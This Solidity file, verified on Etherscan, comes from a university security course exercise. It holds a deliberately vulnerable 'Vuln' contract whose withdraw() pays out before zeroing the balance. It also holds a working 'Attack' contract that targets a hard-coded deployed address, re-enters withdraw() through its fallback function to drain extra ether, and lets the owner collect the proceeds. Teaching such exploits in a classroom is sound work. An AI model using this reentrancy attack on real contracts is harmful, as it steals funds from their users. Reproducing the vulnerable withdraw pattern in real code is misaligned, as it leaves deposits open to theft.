/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {

  uint256 public i = 1;
  Vuln public vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
  address owner;
  address vuln_contract;

  constructor() public {
    owner = msg.sender;
    vuln_contract = address(this);
   }

  function attack() public payable {

      vuln.deposit.value(msg.value)();
      vuln.withdraw();

  }

  fallback () external payable{
      if(i<3)
      {
          i=i+1;
          vuln.withdraw();
      }
  }
  
  function getEth() public{
      if (msg.sender == owner) {
            require(msg.sender.send(address(this).balance));
        }
  } 

}